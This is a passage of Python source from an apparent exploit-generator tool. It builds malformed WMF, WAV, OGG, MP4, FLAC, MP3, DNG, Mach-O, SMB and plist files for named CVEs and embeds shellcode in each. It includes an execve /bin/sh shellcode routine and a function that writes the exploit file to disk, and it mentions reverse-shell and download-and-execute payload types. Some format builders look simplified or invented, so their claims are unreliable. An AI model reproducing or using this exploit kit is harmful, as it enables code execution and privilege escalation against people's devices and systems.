        # Max record size (malformed - triggers integer overflow)
        wmf += struct.pack('<I', 0xFFFFFFFF)

        # Number of members (should be 0)
        wmf += struct.pack('<H', 0)

        # === Records ===

        # SetWindowOrg record
        record = struct.pack('<I', 5)  # Size in words
        record += struct.pack('<H', 0x020B)  # Function: SetWindowOrg
        record += struct.pack('<hh', 0, 0)  # Y, X
        wmf += record

        # SetWindowExt record (huge values trigger overflow)
        record = struct.pack('<I', 5)  # Size
        record += struct.pack('<H', 0x020C)  # Function: SetWindowExt
        record += struct.pack('<HH', 0xFFFF, 0xFFFF)  # Huge extents
        wmf += record

        # CreateBrushIndirect (with embedded shellcode)
        record_size = 7 + len(shellcode) // 2
        record = struct.pack('<I', record_size)
        record += struct.pack('<H', 0x02FC)  # Function: CreateBrushIndirect
        record += struct.pack('<H', 0)  # Style: BS_SOLID

        # Color (embed shellcode here)
        record += shellcode + b'\x00' * (1024 - len(shellcode))

        wmf += record

        # End of file
        record = struct.pack('<I', 3)  # Size
        record += struct.pack('<H', 0x0000)  # Function: EOF
        wmf += record

        # Update file size
        file_size_words = len(wmf) // 2
        wmf = wmf[:size_pos] + struct.pack('<I', file_size_words) + wmf[size_pos + 4:]

        return wmf

    def _cve_2005_4560_wmf(self, shellcode):
        """
        CVE-2005-4560: WMF SETABORTPROC vulnerability

        Vulnerability: SETABORTPROC record in WMF allows arbitrary code execution.
        Classic vulnerability, widely exploited in 2005-2006.

        Target: Windows GDI (WMF parsing)
        Impact: Zero-click RCE via crafted WMF
        """
        # WMF with SETABORTPROC record

        # Placeable header
        wmf = b'\xD7\xCD\xC6\x9A\x00\x00'
        wmf += struct.pack('<hhhh', 0, 0, 1000, 1000)  # Bounding box
        wmf += struct.pack('<H', 1440)  # Units per inch
        wmf += b'\x00\x00\x00\x00'  # Reserved
        wmf += b'\x00\x00'  # Checksum

        # WMF header
        wmf += struct.pack('<H', 1)  # Type
        wmf += struct.pack('<H', 9)  # Header size
        wmf += struct.pack('<H', 0x0300)  # Version
        wmf += struct.pack('<I', 0)  # Size (placeholder)
        size_pos = len(wmf) - 4
        wmf += struct.pack('<H', 0)  # Objects
        wmf += struct.pack('<I', 0)  # Max record
        wmf += struct.pack('<H', 0)  # Members

        # SETABORTPROC record - THE VULNERABILITY
        # This record type allows specifying a procedure address
        # We provide shellcode address

        record_size = 4 + len(shellcode) // 2
        record = struct.pack('<I', record_size)  # Size in words
        record += struct.pack('<H', 0x0105)  # SETABORTPROC function

        # "Procedure address" - actually shellcode
        record += shellcode
        record += b'\x90' * (512 - len(shellcode))  # NOP sled

        wmf += record

        # EOF
        wmf += struct.pack('<IH', 3, 0x0000)

        # Update size
        size = len(wmf) // 2
        wmf = wmf[:size_pos] + struct.pack('<I', size) + wmf[size_pos + 4:]

        return wmf

    # ==================== PRIORITY 3 CVEs ====================

    def _cve_2017_6827_audiofile_wav(self, shellcode):
        """
        CVE-2017-6827: audiofile MSADPCM heap overflow

        Vulnerability: Heap overflow in MSADPCM::initializeCoefficients() in
        MSADPCM.cpp when processing crafted WAV files.

        Target: audiofile (libaudiofile) 0.3.6
        Impact: Remote code execution via crafted WAV
        """
        # WAV/RIFF file with MSADPCM compression

        wav = b'RIFF'

        # File size (placeholder)
        wav += b'\x00\x00\x00\x00'
        size_pos = 4

        # WAVE format
        wav += b'WAVE'

        # fmt chunk
        wav += b'fmt '
        wav += struct.pack('<I', 50)  # Chunk size (MSADPCM needs extra data)
        wav += struct.pack('<H', 2)   # Format: MSADPCM (0x0002)
        wav += struct.pack('<H', 2)   # Channels
        wav += struct.pack('<I', 44100)  # Sample rate
        wav += struct.pack('<I', 22050)  # Byte rate
        wav += struct.pack('<H', 1024)   # Block align
        wav += struct.pack('<H', 4)      # Bits per sample

        # Extra format bytes for MSADPCM
        wav += struct.pack('<H', 32)  # Extra size
        wav += struct.pack('<H', 512)  # Samples per block

        # Coefficient pairs - MALFORMED to trigger overflow
        num_coef = 256  # Should be 7, we send 256 to overflow
        wav += struct.pack('<H', num_coef)

        for i in range(num_coef):
            wav += struct.pack('<hh', 256 + i, 128 - i)  # Coefficient pairs

        # data chunk with shellcode
        wav += b'data'
        data_size = len(shellcode) + 2048
        wav += struct.pack('<I', data_size)
        wav += shellcode
        wav += b'\x00' * 2048

        # Update RIFF size
        riff_size = len(wav) - 8
        wav = wav[:size_pos] + struct.pack('<I', riff_size) + wav[size_pos + 4:]

        return wav

    def _cve_2018_5146_libvorbis(self, shellcode):
        """
        CVE-2018-5146: libvorbis out-of-bounds write

        Vulnerability: OOB write during codebook decoding in vorbis_book_decodev_set()
        in vorbis_codebook.c.

        Target: libvorbis (OGG Vorbis decoder)
        Impact: Memory corruption, browser crashes, possible RCE
        """
        # OGG container with malformed Vorbis stream

        ogg = b'OggS'  # Capture pattern
        ogg += b'\x00'  # Version
        ogg += b'\x02'  # Header type: BOS (Beginning of stream)

        # Granule position
        ogg += b'\x00' * 8

        # Serial number
        ogg += struct.pack('<I', 0x12345678)

        # Page sequence
        ogg += struct.pack('<I', 0)

        # Checksum (placeholder)
        ogg += b'\x00\x00\x00\x00'
        checksum_pos = len(ogg) - 4

        # Number of segments
        ogg += b'\x01'

        # Segment table
        ogg += b'\xFF'  # 255 bytes in segment

        # Vorbis identification header
        packet = b'\x01'  # Packet type: identification
        packet += b'vorbis'

        packet += struct.pack('<I', 0)  # Vorbis version
        packet += b'\x02'  # Channels
        packet += struct.pack('<I', 44100)  # Sample rate

        # Bitrate (max, nominal, min)
        packet += struct.pack('<III', 128000, 128000, 128000)

        # Block sizes (malformed to trigger vulnerability)
        packet += b'\xF0'  # blocksizes (4 bits each), both max (15) - invalid!

        packet += b'\x01'  # Framing bit

        # Pad to 255 bytes
        packet += b'\x00' * (255 - len(packet))

        ogg += packet

        # Second page with setup header (malformed codebook)
        ogg += b'OggS\x00\x00'  # Capture + version + flags
        ogg += b'\x00' * 8  # Granule
        ogg += struct.pack('<I', 0x12345678)  # Serial
        ogg += struct.pack('<I', 1)  # Sequence
        ogg += b'\x00\x00\x00\x00'  # Checksum
        ogg += b'\x01'  # 1 segment
        ogg += b'\xFF'  # 255 bytes

        # Setup header with malformed codebook
        setup = b'\x05'  # Packet type: setup
        setup += b'vorbis'

        # Codebook count (malformed - too many)
        setup += b'\xFF'  # 256 codebooks (triggers OOB write)

        # Malformed codebook entries with shellcode
        setup += shellcode
        setup += b'\x00' * (255 - len(setup))

        ogg += setup

        return ogg

    def _cve_2022_22675_appleavd(self, shellcode):
        """
        CVE-2022-22675: AppleAVD video accelerator buffer overflow

        Vulnerability: Buffer overflow in parsePredWeightTable() function.
        Allows writing 16-bit values at controlled offsets.

        Target: AppleAVD kernel driver (iOS/macOS)
        Impact: Kernel RCE, used in iOS jailbreaks
        """
        # H.264 NAL unit with malformed prediction weight table
        # Wrapped in MP4 container

        # MP4/ISO Base Media File Format

        # ftyp box (file type)
        mp4 = struct.pack('>I', 20)  # Box size
        mp4 += b'ftyp'
        mp4 += b'mp42'  # Major brand
        mp4 += struct.pack('>I', 0)  # Minor version
        mp4 += b'mp42mp41'  # Compatible brands

        # mdat box (media data) - contains H.264 NAL units
        mdat_start = len(mp4)
        mp4 += b'\x00\x00\x00\x00'  # Size placeholder
        mp4 += b'mdat'

        # H.264 NAL unit: Slice header with malformed pred_weight_table

        # NAL unit header
        nal = b'\x00\x00\x00\x01'  # Start code
        nal += b'\x65'  # NAL type: IDR slice

        # Slice header (simplified, focuses on pred_weight_table)

        # first_mb_in_slice
        nal += b'\x00'

        # slice_type (P slice)
        nal += b'\x00'

        # pic_parameter_set_id
        nal += b'\x00'

        # frame_num
        nal += b'\x00'

        # Prediction weight table - THE VULNERABILITY
        # luma_log2_weight_denom (malformed)
        nal += b'\xFF'  # Large value triggers overflow

        # chroma_log2_weight_denom
        nal += b'\xFF'

        # Weight/offset pairs (malformed to write beyond bounds)
        for i in range(32):  # Too many references
            nal += struct.pack('>H', 0x4141)  # Weight (controlled write!)
            nal += struct.pack('>H', 0x4242)  # Offset

        # Shellcode embedded in slice data
        nal += shellcode
        nal += b'\x00' * (1024 - len(shellcode))

        mp4 += nal

        # Update mdat size
        mdat_size = len(mp4) - mdat_start
        mp4 = mp4[:mdat_start] + struct.pack('>I', mdat_size) + mp4[mdat_start + 4:]

        return mp4

    def _cve_2021_0561_flac(self, shellcode):
        """
        CVE-2021-0561: FLAC encoder OOB write

        Vulnerability: Out-of-bounds write in append_to_verify_fifo_interleaved_()
        in stream_encoder.c. Missing bounds check.

        Target: FLAC < 1.3.4
        Impact: Local information disclosure
        """
        # Similar to other FLAC CVEs but targets encoder
        # Create FLAC with parameters that trigger OOB during encoding verification

        flac = b'fLaC'

        # STREAMINFO with specific parameters to trigger encoder bug
        flac += b'\x00\x00\x22'  # STREAMINFO, 34 bytes

        # blocksize triggering encoder overflow
        flac += struct.pack('>H', 65535)  # min = max value
        flac += struct.pack('>H', 65535)  # max = max value

        flac += b'\x00\x00\x00'  # min framesize
        flac += b'\xFF\xFF\xFF'  # max framesize (huge)

        # 192kHz sample rate (upper limit)
        flac += struct.pack('>I', (192000 << 8) | (7 << 5) | 31)  # 8ch, 32-bit

        flac += b'\xFF' * 5  # Huge sample count
        flac += b'\x00' * 16  # MD5

        # APPLICATION block with shellcode
        flac += b'\x82\x00\x04\x00'  # Last metadata, APPLICATION, 1024 bytes
        flac += b'SHEL'
        flac += shellcode + b'\x00' * (1020 - len(shellcode))

        return flac

    def _cve_2017_11126_mpg123(self, shellcode):
        """
        CVE-2017-11126: mpg123 global buffer overflow

        Vulnerability: Global buffer overflow in III_i_stereo() function in layer3.c.
        Affects intensity stereo processing.

        Target: mpg123 (pre-July 2017)
        Impact: Remote DoS, possible information disclosure
        """
        # MP3 with crafted intensity stereo data

        mp3 = b'ID3\x04\x00\x00\x00\x00\x00\x00'  # ID3 header

        # MP3 frame with Layer III, intensity stereo mode
        mp3 += b'\xFF\xFB'  # Sync + MPEG1 Layer III

        # Mode: Joint stereo with intensity stereo
        mp3 += b'\x90'  # Bitrate + sample rate
        mp3 += b'\x50'  # Joint stereo, intensity stereo on

        # Side info crafted for intensity stereo overflow
        side_info = bytearray(32)

        # Craft scalefac_compress and window_switching to trigger overflow
        side_info[0] = 0xFF
        side_info[1] = 0xFF

        # is_pos values (intensity stereo positions) - overflow trigger
        for i in range(2, 32):
            side_info[i] = 0xFF  # Max values cause overflow

        mp3 += bytes(side_info)

        # Main data with shellcode
        mp3 += shellcode + b'\x00' * (512 - len(shellcode))

        return mp3

    def _cve_2021_40426_libsox(self, shellcode):
        """
        CVE-2021-40426: Sound Exchange libsox heap overflow

        Vulnerability: Heap buffer overflow in sphere.c start_read() function.
        NIST SPHERE audio file format parser.

        Target: libsox
        Impact: RCE via crafted SPHERE file
        """
        # NIST SPHERE audio file format

        # SPHERE header
        sphere = b'NIST_1A\n'
        sphere += b'   1024\n'  # Header size (10 chars + newline)

        # Header fields (key: value pairs)
        # Malformed to trigger overflow in start_read()

        # channel_count (huge value triggers allocation)
        sphere += b'channel_count -i 65535\n'

        # sample_rate
        sphere += b'sample_rate -i 44100\n'

        # sample_n_bytes (malformed)
        sphere += b'sample_n_bytes -i 1048576\n'  # Huge value

        # sample_count (triggers overflow calculation)
        sphere += b'sample_count -i 4294967295\n'  # Max uint32

        # sample_coding (PCM)
        sphere += b'sample_coding -s4 pcm\n'

        # Malformed field with excessive length (overflow trigger)
        sphere += b'malformed_field -s999999 '
        sphere += b'A' * 512  # Overflow the header buffer
        sphere += b'\n'

        # end_head marker
        sphere += b'end_head\n'

        # Pad to 1024 bytes
        while len(sphere) < 1024:
            sphere += b' '

        # Audio data with shellcode
        sphere += shellcode + b'\x00' * (2048 - len(shellcode))

        return sphere

    def _cve_2025_43300_imageio_dng(self, shellcode):
        """
        CVE-2025-43300: Apple ImageIO DNG/TIFF JPEG Lossless OOB write

        Vulnerability: Out-of-bounds write in CDNGLosslessJpegUnpacker (RawCamera).
        Mismatch between TIFF SamplesPerPixel metadata and JPEG SOF3 NumComponents.
        When SamplesPerPixel=2 but NumComponents=1, loop writes 16-bit × 2 samples
        per pixel causing double writes per row → OOB write.

        Target: Apple ImageIO framework (iOS/iPadOS/macOS)
        Impact: Zero-click RCE via iMessage (actively exploited in the wild)
        CVSS: CRITICAL
        Patched: iOS 18.6.2, macOS Sequoia 15.6.1, Sonoma 14.7.8, Ventura 13.7.8
        """
        # Create malicious DNG file (TIFF with JPEG Lossless compression)

        # TIFF Header (Little Endian)
        dng = b'II'  # Little endian
        dng += struct.pack('<H', 42)  # TIFF magic number
        dng += struct.pack('<I', 8)  # Offset to first IFD

        # IFD (Image File Directory) - 12 bytes per entry
        ifd_entries = []

        # ImageWidth tag (256)
        ifd_entries.append(struct.pack('<HHII', 256, 4, 1, 1920))  # Width

        # ImageHeight tag (257)
        ifd_entries.append(struct.pack('<HHII', 257, 4, 1, 1080))  # Height

        # BitsPerSample tag (258) - DNG uses 16-bit
        ifd_entries.append(struct.pack('<HHII', 258, 3, 1, 16))

        # Compression tag (259) - JPEG Lossless (7)
        ifd_entries.append(struct.pack('<HHII', 259, 3, 1, 7))

        # PhotometricInterpretation tag (262) - LinearRaw (34892)
        ifd_entries.append(struct.pack('<HHII', 262, 3, 1, 34892))

        # CRITICAL: SamplesPerPixel tag (277) - Set to 2 (THE VULNERABILITY)
        ifd_entries.append(struct.pack('<HHII', 277, 3, 1, 2))  # Mismatch!

        # StripOffsets tag (273) - Offset to JPEG data
        jpeg_offset = 8 + 2 + (len(ifd_entries) + 1) * 12 + 4
        ifd_entries.append(struct.pack('<HHII', 273, 4, 1, jpeg_offset))

        # StripByteCounts tag (279)
        ifd_entries.append(struct.pack('<HHII', 279, 4, 1, 4096))

        # DNGVersion tag (50706) - DNG 1.4.0.0
        ifd_entries.append(struct.pack('<HHII', 50706, 1, 4, 0x00000401))

        # Write IFD
        dng += struct.pack('<H', len(ifd_entries))  # Number of entries
        for entry in ifd_entries:
            dng += entry
        dng += struct.pack('<I', 0)  # No next IFD

        # JPEG Lossless Stream (SOF3) - THE EXPLOIT
        # Start of Image
        jpeg_stream = b'\xff\xd8'

        # SOF3 (Start of Frame, Lossless JPEG)
        sof3 = b'\xff\xc3'  # SOF3 marker
        sof3 += struct.pack('>H', 11)  # Length (11 bytes)
        sof3 += b'\x10'  # Precision (16-bit)
        sof3 += struct.pack('>H', 1080)  # Height
        sof3 += struct.pack('>H', 1920)  # Width
        sof3 += b'\x01'  # NumComponents = 1 (MISMATCH with SamplesPerPixel=2!)
        sof3 += b'\x01\x11\x00'  # Component 1: ID, sampling, quantization

        jpeg_stream += sof3

        # DHT (Define Huffman Table) - simplified
        dht = b'\xff\xc4'
        dht += struct.pack('>H', 21)  # Length
        dht += b'\x00'  # Table class/ID
        dht += b'\x00' * 16  # Number of codes of each length
        dht += b'\x00'  # Table values (empty for exploit)
        jpeg_stream += dht

        # SOS (Start of Scan)
        sos = b'\xff\xda'
        sos += struct.pack('>H', 8)  # Length
        sos += b'\x01'  # Components in scan
        sos += b'\x01\x00'  # Component 1
        sos += b'\x00\x3f\x00'  # Predictor, point transform
        jpeg_stream += sos

        # Compressed image data with shellcode embedded
        # This triggers the OOB write during decompression
        jpeg_stream += b'\xff' * 256  # Trigger data
        jpeg_stream += shellcode
        jpeg_stream += b'\x00' * (2048 - len(shellcode))

        # End of Image
        jpeg_stream += b'\xff\xd9'

        # Pad to match StripByteCounts
        while len(jpeg_stream) < 4096:
            jpeg_stream += b'\x00'

        dng += jpeg_stream

        return dng

    def _cve_2025_24228_kernel(self, shellcode):
        """
        CVE-2025-24228: macOS Kernel buffer overflow

        Vulnerability: Buffer overflow in macOS kernel (CWE-125 Out-of-bounds Read).
        An app may execute arbitrary code with kernel privileges.

        Target: macOS Ventura 13.0-13.7.4, Sonoma 14.0-14.7.4, Sequoia 15.0-15.3
        Impact: Kernel-level code execution with full system privileges
        CVSS: 7.8 (HIGH)
        Patched: Ventura 13.7.5, Sonoma 14.7.5, Sequoia 15.4
        """
        # Create Mach-O binary that triggers kernel buffer overflow
        # This is a simplified exploit trigger using IOKit framework calls

        # Mach-O 64-bit header
        macho = struct.pack('<I', 0xfeedfacf)  # magic (MH_MAGIC_64)
        macho += struct.pack('<I', 0x01000007)  # cputype (CPU_TYPE_X86_64)
        macho += struct.pack('<I', 0x00000003)  # cpusubtype
        macho += struct.pack('<I', 0x00000002)  # filetype (MH_EXECUTE)
        macho += struct.pack('<I', 3)  # ncmds (3 load commands)
        macho += struct.pack('<I', 256)  # sizeofcmds
        macho += struct.pack('<I', 0x00000001)  # flags (MH_NOUNDEFS)
        macho += struct.pack('<I', 0)  # reserved

        # LC_SEGMENT_64 command
        seg_cmd = struct.pack('<II', 0x19, 232)  # cmd, cmdsize
        seg_cmd += b'__TEXT\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'  # segname
        seg_cmd += struct.pack('<QQ', 0, 0x1000)  # vmaddr, vmsize
        seg_cmd += struct.pack('<QQ', 0, 0x1000)  # fileoff, filesize
        seg_cmd += struct.pack('<II', 7, 7)  # maxprot, initprot
        seg_cmd += struct.pack('<II', 1, 0)  # nsects, flags

        # Section header
        sect = b'__text\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        sect += b'__TEXT\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        sect += struct.pack('<QQ', 0, 512)  # addr, size
        sect += struct.pack('<IIII', 256, 0, 0, 0)  # offset, align, reloff, nreloc
        sect += struct.pack('<II', 0x80000400, 0)  # flags, reserved

        seg_cmd += sect
        macho += seg_cmd

        # LC_UNIXTHREAD (entry point)
        thread_cmd = struct.pack('<II', 0x5, 184)  # cmd, cmdsize
        thread_cmd += struct.pack('<II', 4, 42)  # flavor (x86_THREAD_STATE64), count
        thread_cmd += b'\x00' * 160  # thread state
        thread_cmd += struct.pack('<Q', 0x100)  # RIP = entry point
        thread_cmd += b'\x00' * 8
        macho += thread_cmd

        # Pad header to 256 bytes
        macho += b'\x00' * (256 - len(macho))

        # Exploit code that triggers kernel overflow via IOKit
        # Uses IOConnectCallMethod with oversized input buffer
        exploit_code = bytes([
            # Trigger kernel overflow via IOKit call
            0x48, 0x31, 0xc0,              # xor rax, rax
            0x48, 0xc7, 0xc7, 0xff, 0xff, 0xff, 0xff,  # mov rdi, -1 (invalid connection)
            0x48, 0xc7, 0xc6, 0x00, 0x00, 0x00, 0x00,  # mov rsi, 0 (selector)
        ])

        # Oversized buffer that triggers kernel overflow
        exploit_code += b'A' * 8192  # Buffer overflow trigger
        exploit_code += shellcode
        exploit_code += b'\x00' * (512 - len(exploit_code) - len(shellcode))

        macho += exploit_code

        return macho

    def _cve_2025_24153_smb(self, shellcode):
        """
        CVE-2025-24153: macOS SMB buffer overflow

        Vulnerability: Buffer overflow in SMB implementation.
        An app with root privileges may execute arbitrary code with kernel privileges.

        Target: macOS (fixed in Sequoia 15.3, Sonoma 14.7.3)
        Impact: Privilege escalation to kernel level via SMB
        CVSS: HIGH
        """
        # SMB2 packet with malformed buffer causing overflow

        # NetBIOS Session Service header
        smb = b'\x00'  # Message type (Session message)
        smb += b'\x00\x00\x00'  # Length (will be set later)

        # SMB2 Header
        smb += b'\xfe\x53\x4d\x42'  # Protocol ID (0xfe + 'SMB')
        smb += struct.pack('<H', 64)  # StructureSize
        smb += struct.pack('<H', 0)  # CreditCharge
        smb += struct.pack('<I', 0)  # Status
        smb += struct.pack('<H', 5)  # Command (SMB2_CREATE)
        smb += struct.pack('<H', 0)  # Credits
        smb += struct.pack('<I', 0)  # Flags
        smb += struct.pack('<I', 0)  # NextCommand
        smb += struct.pack('<Q', 1)  # MessageId
        smb += struct.pack('<I', 0)  # Reserved
        smb += struct.pack('<I', 1)  # TreeId
        smb += struct.pack('<Q', 0x1234567890abcdef)  # SessionId
        smb += b'\x00' * 16  # Signature

        # SMB2 CREATE Request (malformed)
        create_req = struct.pack('<H', 57)  # StructureSize
        create_req += b'\x00'  # SecurityFlags
        create_req += b'\x00'  # RequestedOplockLevel
        create_req += struct.pack('<I', 0)  # ImpersonationLevel
        create_req += struct.pack('<Q', 0)  # SmbCreateFlags
        create_req += struct.pack('<Q', 0)  # Reserved
        create_req += struct.pack('<I', 0x001f01ff)  # DesiredAccess
        create_req += struct.pack('<I', 0)  # FileAttributes
        create_req += struct.pack('<I', 7)  # ShareAccess
        create_req += struct.pack('<I', 1)  # CreateDisposition
        create_req += struct.pack('<I', 0)  # CreateOptions

        # Name - OVERSIZED to trigger buffer overflow
        name_offset = len(smb) + len(create_req)
        create_req += struct.pack('<H', name_offset)  # NameOffset

        # VULNERABILITY: Malformed name length triggers overflow
        malicious_name_len = 65535  # Huge value
        create_req += struct.pack('<H', malicious_name_len)  # NameLength

        create_req += struct.pack('<I', 0)  # CreateContextsOffset
        create_req += struct.pack('<I', 0)  # CreateContextsLength

        smb += create_req

        # Malicious name buffer with shellcode
        smb += b'\\\\' + b'A' * 1024  # Path prefix
        smb += shellcode
        smb += b'\x00' * (4096 - len(shellcode))

        # Update NetBIOS length
        total_len = len(smb) - 4
        smb = smb[0:1] + struct.pack('>I', total_len)[1:4] + smb[4:]

        return smb

    def _cve_2025_24156_xsan(self, shellcode):
        """
        CVE-2025-24156: macOS Xsan integer overflow

        Vulnerability: Integer overflow in Xsan filesystem driver.
        Addressed through improved input validation.
        Enables privilege elevation in applications.

        Target: macOS (fixed in Sequoia 15.3)
        Impact: Privilege escalation via integer overflow
        CVSS: MEDIUM-HIGH
        """
        # Xsan filesystem metadata with integer overflow

        # Xsan volume header
        xsan = b'XSAN'  # Magic
        xsan += struct.pack('>I', 1)  # Version
        xsan += struct.pack('>Q', 0xffffffffffffffff)  # Volume size (overflow!)
        xsan += struct.pack('>Q', 0xffffffff00000000)  # Block count (overflow!)
        xsan += struct.pack('>I', 4096)  # Block size
        xsan += struct.pack('>I', 0xffffffff)  # Inode count (overflow!)

        # Stripe group configuration
        xsan += struct.pack('>I', 255)  # Stripe group count

        # Each stripe group has malicious parameters
        for i in range(255):
            # Stripe group header
            stripe = struct.pack('>I', i)  # Group ID
            stripe += struct.pack('>Q', 0xffffffff)  # Size (integer overflow)
            stripe += struct.pack('>H', 65535)  # Stripe width (overflow)
            stripe += struct.pack('>H', 65535)  # Stripe depth (overflow)

            # These overflows cause incorrect buffer allocation
            # Leading to heap overflow when accessing data
            xsan += stripe

        # Inode table with crafted entries
        xsan += struct.pack('>I', 0xffffffff)  # Inode table offset (overflow)
        xsan += struct.pack('>I', 0xffffffff)  # Inode table size (overflow)

        # Malicious inode that triggers privilege escalation
        inode = struct.pack('>H', 1)  # Type (file)
        inode += struct.pack('>H', 0)  # Flags
        inode += struct.pack('>I', 0)  # UID (root)
        inode += struct.pack('>I', 0)  # GID (wheel)
        inode += struct.pack('>I', 0o4755)  # Mode (setuid root!)
        inode += struct.pack('>Q', 0xffffffff)  # Size (overflow)
        inode += struct.pack('>Q', 0)  # Create time
        inode += struct.pack('>Q', 0)  # Modify time

        # Data extents with overflow
        inode += struct.pack('>I', 100)  # Extent count
        for i in range(100):
            # Each extent descriptor has overflow
            inode += struct.pack('>Q', 0xffffffff * i)  # Start block
            inode += struct.pack('>I', 0xffffffff)  # Block count (overflow!)

        xsan += inode

        # Embedded shellcode in "file data"
        xsan += shellcode
        xsan += b'\x00' * (8192 - len(xsan) - len(shellcode))

        return xsan

    def _cve_2025_24154_webcontentfilter(self, shellcode):
        """
        CVE-2025-24154: macOS WebContentFilter out-of-bounds write

        Vulnerability: Out-of-bounds write in WebContentFilter framework.
        Addressed with improved input validation.
        Causes system termination or kernel memory corruption.

        Target: macOS (fixed in Sequoia 15.3)
        Impact: Kernel memory corruption, system crash or code execution
        CVSS: HIGH
        """
        # WebContentFilter configuration plist with malicious data

        # Binary plist header
        plist = b'bplist00'

        # Object table
        objects = []

        # Dictionary with malicious entries
        # Key 1: FilterRules
        objects.append(b'\x50FilterRules')  # String

        # Value 1: Array of rules with OOB write trigger
        rules_array = b'\xa0'  # Empty array marker (will be modified)
        objects.append(rules_array)

        # Key 2: ContentCategories (triggers OOB write)
        objects.append(b'\x51ContentCategories')

        # Value 2: Malicious array with oversized data
        # This triggers out-of-bounds write in parser
        malicious_data = b'\xaf'  # Array marker
        malicious_data += struct.pack('>H', 65535)  # Count (overflow!)

        # Each "category" entry is crafted to write beyond buffer
        for i in range(100):  # Reduced count to avoid huge file
            # String object with length that causes OOB write
            entry = b'\x5f'  # String marker with 1-byte length
            entry += struct.pack('B', 255)  # Length
            entry += b'A' * 255  # Data
            malicious_data += entry

        objects.append(malicious_data)

        # Key 3: PluginBundleID (another trigger vector)
        objects.append(b'\x50PluginBundleID')

        # Value 3: String with shellcode
        plugin_str = b'\x5f'
        plugin_str += struct.pack('B', min(len(shellcode), 255))
        plugin_str += shellcode[:255]
        objects.append(plugin_str)

        # Build offset table
        offset_table = b''
        current_offset = 8  # After header
        offsets = []

        for obj in objects:
            offsets.append(current_offset)
            current_offset += len(obj)

        # Write objects
        for obj in objects:
            plist += obj

        # Offset table
        offset_size = 2  # 2 bytes per offset
        for off in offsets:
            plist += struct.pack('>H', off)

        # Trailer
        trailer = b'\x00' * 5  # Unused
        trailer += struct.pack('B', offset_size)  # Offset int size
        trailer += struct.pack('B', 2)  # Object ref size
        trailer += struct.pack('>Q', len(objects))  # Num objects
        trailer += struct.pack('>Q', 0)  # Root object
        trailer += struct.pack('>Q', current_offset)  # Offset table offset

        plist += trailer

        # Pad with additional malicious data to ensure OOB write
        plist += b'\xff' * 1024
        plist += shellcode * 4

        return plist

    def _make_chunk(self, name, data):
        """Create PNG chunk with proper CRC"""
        chunk = struct.pack('>I', len(data)) + name + data
        crc = self._crc32(name + data)
        return chunk + struct.pack('>I', crc)

    def _crc32(self, data):
        """Calculate CRC32 for PNG chunks"""
        import zlib
        return zlib.crc32(data) & 0xffffffff

    def generate_shellcode(self, payload_type='exec_sh'):
        """
        Generate shellcode payloads

        Args:
            payload_type: Type of shellcode (exec_sh, reverse_shell, download_exec)

        Returns:
            bytes: Shellcode
        """
        shellcodes = {
            # Execute /bin/sh
            'exec_sh': bytes([
                0x48, 0x31, 0xd2,                          # xor rdx, rdx
                0x48, 0xbb, 0x2f, 0x2f, 0x62, 0x69,        # mov rbx, '//bin/sh'
                0x6e, 0x2f, 0x73, 0x68,
                0x48, 0xc1, 0xeb, 0x08,                    # shr rbx, 8
                0x53,                                       # push rbx
                0x48, 0x89, 0xe7,                          # mov rdi, rsp
                0x50,                                       # push rax
                0x57,                                       # push rdi
                0x48, 0x89, 0xe6,                          # mov rsi, rsp
                0xb0, 0x3b,                                # mov al, 0x3b (execve)
                0x0f, 0x05                                 # syscall
            ]),

            # NOP sled (for testing)
            'nop_sled': b'\x90' * 128,

            # POC marker (non-executable, just marks successful overflow)
            'poc_marker': b'SHELLCODE_EXECUTED_HERE!' * 10,
        }

        return shellcodes.get(payload_type, shellcodes['poc_marker'])

    def get_supported_cves(self):
        """
        Get list of supported CVE IDs

        Returns:
            List of supported CVE ID strings
        """
        return sorted(self.exploits.keys())

    def validate_cve_id(self, cve_id: str) -> str:
        """
        Validate CVE ID

        Args:
            cve_id: CVE identifier to validate

        Returns:
            Validated CVE ID (normalized)

        Raises:
            ValidationError: If CVE ID is invalid
        """
        # Normalize CVE ID
        cve_normalized = cve_id.upper().strip()

        if cve_normalized not in self.exploits:
            supported = ', '.join(sorted(self.exploits.keys()))
            raise ValidationError(
                f"Unknown CVE ID: {cve_id}\n"
                f"Supported CVEs ({len(self.exploits)} total):\n"
                f"  {supported}"
            )

        return cve_normalized

    def generate_exploit(self, cve_id, output_path, payload_type='poc_marker', tui=None):
        """
        Generate exploit image

        Args:
            cve_id: CVE identifier
            output_path: Where to save exploit file
            payload_type: Type of shellcode payload
            tui: TUI helper instance (optional)

        Raises:
            ValidationError: If CVE ID is invalid
        """
        # Validate CVE ID
        try:
            cve_id = self.validate_cve_id(cve_id)
        except ValidationError as e:
            self.logger.error(f"CVE validation failed: {e}")
            raise

        # Initialize TUI if not provided
        if tui is None and TUI is not None:
            tui = TUI()

        # Generate shellcode
        if tui:
            tui.info(f"Generating {payload_type} shellcode...")
        shellcode = self.generate_shellcode(payload_type)

        # Generate exploit
        if tui:
            tui.info(f"Building {cve_id} exploit...")
        exploit_func = self.exploits[cve_id]
        exploit_data = exploit_func(shellcode)

        # Write to file
        if tui:
            tui.info(f"Writing to {output_path}...")
        with open(output_path, 'wb') as f:
            f.write(exploit_data)

        # Success message with TUI
        if tui:
            print()
            tui.success(f"Exploit generated successfully!", prefix="  ")
            print()
            tui.key_value("Output file", output_path, 20)
            tui.key_value("CVE ID", cve_id, 20)
            tui.key_value("Payload type", payload_type, 20)
            tui.key_value("File size", f"{len(exploit_data):,} bytes", 20)
            tui.key_value("Shellcode size", f"{len(shellcode):,} bytes", 20)
        else:
            # Fallback to plain output
            print(f"[+] Exploit generated: {output_path}")
            print(f"    CVE: {cve_id}")
            print(f"    Payload: {payload_type}")
            print(f"    Size: {len(exploit_data)} bytes")
            print(f"    Shellcode size: {len(shellcode)} bytes")

        # Target information
        targets = {
            # EXISTING
            'CVE-2015-8540': ('libpng 1.6.x - Buffer overflow in chunk name', 'high'),
            'CVE-2019-7317': ('libpng - Use-after-free in image handling', 'high'),
            'CVE-2018-14498': ('libjpeg - Heap buffer over-read', 'medium'),
            'CVE-2019-15133': ('giflib - Division by zero', 'medium'),
            'CVE-2016-3977': ('giflib - Heap buffer overflow', 'high'),

            # PRIORITY 1
            'CVE-2023-4863': ('libwebp 0.5.0-1.3.1 - Heap overflow in Huffman decoder (CRITICAL - ACTIVELY EXPLOITED)', 'critical'),
